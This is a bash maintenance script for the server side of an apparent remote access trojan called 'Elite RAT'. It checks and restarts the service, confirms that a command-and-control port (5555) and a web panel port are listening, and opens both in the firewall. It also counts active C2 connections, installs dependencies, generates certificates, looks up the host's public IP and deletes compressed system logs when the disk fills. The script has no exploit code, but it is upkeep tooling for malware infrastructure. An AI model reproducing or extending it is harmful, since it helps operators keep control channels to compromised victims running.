#!/bin/bash
#############################################################
# ELITE RAT - HEALTH CHECK & TROUBLESHOOTING
# Diagnoses and fixes common issues
#############################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

INSTALL_DIR="/opt/elite_rat"
SERVICE_NAME="elite_rat"

# Check functions
check_service() {
    echo -e "${YELLOW}[*] Checking service status...${NC}"
    
    if systemctl is-active --quiet $SERVICE_NAME; then
        echo -e "${GREEN}[✓] Service is running${NC}"
        return 0
    else
        echo -e "${RED}[✗] Service is not running${NC}"
        echo "    Attempting to start..."
        systemctl start $SERVICE_NAME
        sleep 3
        
        if systemctl is-active --quiet $SERVICE_NAME; then
            echo -e "${GREEN}[✓] Service started successfully${NC}"
        else
            echo -e "${RED}[!] Failed to start service${NC}"
            echo "    Check logs: journalctl -u $SERVICE_NAME -n 50"
            return 1
        fi
    fi
}

check_ports() {
    echo -e "${YELLOW}[*] Checking port availability...${NC}"
    
    # Check C2 port
    if netstat -tuln | grep -q ":5555 "; then
        echo -e "${GREEN}[✓] C2 port 5555 is listening${NC}"
    else
        echo -e "${RED}[✗] C2 port 5555 is not listening${NC}"
    fi
    
    # Check Web port
    if netstat -tuln | grep -q ":5000 "; then
        echo -e "${GREEN}[✓] Web port 5000 is listening${NC}"
    else
        echo -e "${RED}[✗] Web port 5000 is not listening${NC}"
    fi
}

check_python_deps() {
    echo -e "${YELLOW}[*] Checking Python dependencies...${NC}"
    
    cd $INSTALL_DIR
    source venv/bin/activate 2>/dev/null
    
    missing_deps=()
    
    # Check each required module
    for module in flask cryptography pyyaml pyjwt pillow dnspython; do
        if ! python3 -c "import $module" 2>/dev/null; then
            missing_deps+=($module)
        fi
    done
    
    if [ ${#missing_deps[@]} -eq 0 ]; then
        echo -e "${GREEN}[✓] All Python dependencies installed${NC}"
    else
        echo -e "${RED}[✗] Missing dependencies: ${missing_deps[*]}${NC}"
        echo "    Installing missing dependencies..."
        pip install ${missing_deps[*]}
    fi
}

check_certificates() {
    echo -e "${YELLOW}[*] Checking SSL certificates...${NC}"
    
    CERT_DIR="$INSTALL_DIR/certs"
    
    if [ -f "$CERT_DIR/server.crt" ] && [ -f "$CERT_DIR/server.key" ]; then
        echo -e "${GREEN}[✓] SSL certificates found${NC}"
        
        # Check expiry
        expiry=$(openssl x509 -enddate -noout -in "$CERT_DIR/server.crt" | cut -d= -f2)
        echo "    Certificate expires: $expiry"
    else
        echo -e "${RED}[✗] SSL certificates missing${NC}"
        echo "    Generating new certificates..."
        
        mkdir -p $CERT_DIR
        openssl req -x509 -newkey rsa:4096 -nodes \
            -out $CERT_DIR/server.crt \
            -keyout $CERT_DIR/server.key \
            -days 365 \
            -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost" \
            2>/dev/null
        
        echo -e "${GREEN}[✓] New certificates generated${NC}"
    fi
}

check_disk_space() {
    echo -e "${YELLOW}[*] Checking disk space...${NC}"
    
    usage=$(df / | tail -1 | awk '{print $5}' | sed 's/%//')
    
    if [ $usage -lt 80 ]; then
        echo -e "${GREEN}[✓] Disk usage: ${usage}%${NC}"
    elif [ $usage -lt 90 ]; then
        echo -e "${YELLOW}[!] Disk usage: ${usage}% (Warning)${NC}"
    else
        echo -e "${RED}[✗] Disk usage: ${usage}% (Critical!)${NC}"
        echo "    Cleaning logs..."
        
        # Clean old logs
        find /var/log -name "*.gz" -delete 2>/dev/null
        journalctl --vacuum-time=7d 2>/dev/null
        
        # Clean package cache
        apt-get clean 2>/dev/null
    fi
}

check_memory() {
    echo -e "${YELLOW}[*] Checking memory usage...${NC}"
    
    total=$(free -m | grep Mem | awk '{print $2}')
    used=$(free -m | grep Mem | awk '{print $3}')
    usage=$((used * 100 / total))
    
    if [ $usage -lt 80 ]; then
        echo -e "${GREEN}[✓] Memory usage: ${usage}% (${used}MB/${total}MB)${NC}"
    elif [ $usage -lt 90 ]; then
        echo -e "${YELLOW}[!] Memory usage: ${usage}% (Warning)${NC}"
    else
        echo -e "${RED}[✗] Memory usage: ${usage}% (Critical!)${NC}"
        
        # Show top memory consumers
        echo "    Top memory users:"
        ps aux --sort=-%mem | head -5 | awk '{print "    " $11 " - " $4 "%"}'
    fi
}

check_firewall() {
    echo -e "${YELLOW}[*] Checking firewall rules...${NC}"
    
    if command -v ufw > /dev/null; then
        if ufw status | grep -q "Status: active"; then
            echo -e "${GREEN}[✓] Firewall is active${NC}"
            
            # Check required ports
            if ufw status | grep -q "5000/tcp"; then
                echo -e "${GREEN}[✓] Web port allowed${NC}"
            else
                echo -e "${RED}[✗] Web port not allowed${NC}"
                ufw allow 5000/tcp comment 'Elite RAT Web'
            fi
            
            if ufw status | grep -q "5555/tcp"; then
                echo -e "${GREEN}[✓] C2 port allowed${NC}"
            else
                echo -e "${RED}[✗] C2 port not allowed${NC}"
                ufw allow 5555/tcp comment 'Elite RAT C2'
            fi
        else
            echo -e "${YELLOW}[!] Firewall is inactive${NC}"
        fi
    else
        echo -e "${YELLOW}[!] UFW not installed${NC}"
    fi
}

check_connectivity() {
    echo -e "${YELLOW}[*] Checking network connectivity...${NC}"
    
    # Check internet
    if ping -c 1 8.8.8.8 > /dev/null 2>&1; then
        echo -e "${GREEN}[✓] Internet connectivity OK${NC}"
    else
        echo -e "${RED}[✗] No internet connectivity${NC}"
    fi
    
    # Check DNS
    if nslookup github.com > /dev/null 2>&1; then
        echo -e "${GREEN}[✓] DNS resolution OK${NC}"
    else
        echo -e "${RED}[✗] DNS resolution failed${NC}"
    fi
    
    # Check GitHub access
    if curl -s https://api.github.com > /dev/null 2>&1; then
        echo -e "${GREEN}[✓] GitHub access OK${NC}"
    else
        echo -e "${RED}[✗] Cannot reach GitHub${NC}"
    fi
}

check_updates() {
    echo -e "${YELLOW}[*] Checking for updates...${NC}"
    
    cd $INSTALL_DIR
    
    git fetch origin main > /dev/null 2>&1
    
    LOCAL=$(git rev-parse HEAD)
    REMOTE=$(git rev-parse origin/main)
    
    if [ "$LOCAL" != "$REMOTE" ]; then
        echo -e "${YELLOW}[!] Updates available${NC}"
        echo "    Run: $INSTALL_DIR/auto_update.sh"
    else
        echo -e "${GREEN}[✓] System is up to date${NC}"
    fi
}

fix_permissions() {
    echo -e "${YELLOW}[*] Fixing permissions...${NC}"
    
    chown -R root:root $INSTALL_DIR
    chmod 755 $INSTALL_DIR
    chmod 600 $INSTALL_DIR/certs/server.key 2>/dev/null
    chmod +x $INSTALL_DIR/*.sh 2>/dev/null
    chmod +x $INSTALL_DIR/*.py 2>/dev/null
    
    echo -e "${GREEN}[✓] Permissions fixed${NC}"
}

restart_service() {
    echo -e "${YELLOW}[*] Restarting service...${NC}"
    
    systemctl daemon-reload
    systemctl restart $SERVICE_NAME
    
    sleep 3
    
    if systemctl is-active --quiet $SERVICE_NAME; then
        echo -e "${GREEN}[✓] Service restarted successfully${NC}"
    else
        echo -e "${RED}[✗] Service restart failed${NC}"
    fi
}

# Performance check
check_performance() {
    echo -e "${YELLOW}[*] Checking performance metrics...${NC}"
    
    # CPU load
    load=$(uptime | awk -F'load average:' '{print $2}')
    echo "    Load average:$load"
    
    # Active connections
    c2_conn=$(netstat -tn 2>/dev/null | grep :5555 | grep ESTABLISHED | wc -l)
    web_conn=$(netstat -tn 2>/dev/null | grep :5000 | grep ESTABLISHED | wc -l)
    echo "    Active C2 connections: $c2_conn"
    echo "    Active web connections: $web_conn"
    
    # Database size (if exists)
    if [ -f "$INSTALL_DIR/elite.db" ]; then
        db_size=$(du -h "$INSTALL_DIR/elite.db" | cut -f1)
        echo "    Database size: $db_size"
    fi
}

# Main health check
main() {
    echo ""
    echo "=========================================="
    echo -e "${GREEN}ELITE RAT HEALTH CHECK${NC}"
    echo "=========================================="
    echo "Time: $(date)"
    echo "Host: $(hostname)"
    echo "IP: $(curl -s ifconfig.me 2>/dev/null || echo 'Unknown')"
    echo ""
    
    # Run all checks
    check_service
    echo ""
    check_ports
    echo ""
    check_python_deps
    echo ""
    check_certificates
    echo ""
    check_disk_space
    echo ""
    check_memory
    echo ""
    check_firewall
    echo ""
    check_connectivity
    echo ""
    check_updates
    echo ""
    check_performance
    echo ""
    
    # Ask for fixes
    echo "=========================================="
    read -p "Apply automatic fixes? (y/n): " -n 1 -r
    echo ""
    
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        fix_permissions
        restart_service
        echo ""
        echo -e "${GREEN}[✓] Automatic fixes applied${NC}"
    fi
    
    echo ""
    echo "=========================================="
    echo -e "${GREEN}Health check complete!${NC}"
    echo "=========================================="
}

# Run with --auto flag for non-interactive mode
if [ "$1" == "--auto" ]; then
    # Auto mode - just run checks, no fixes
    main | sed 's/Apply automatic fixes.*/Skipping fixes (auto mode)/'
else
    main
fi